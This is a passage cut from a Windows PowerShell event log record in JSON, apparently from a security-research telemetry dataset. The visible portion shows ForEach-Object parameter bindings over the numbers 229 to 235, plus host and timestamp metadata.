name=\"InputObject\"; value=\"229\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"230\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"231\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"232\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"233\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"234\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"235\"\r\n","@timestamp":"2020-09-21T23:18:57.419Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":183697,"Task":8,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Pipeline Execution Details","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
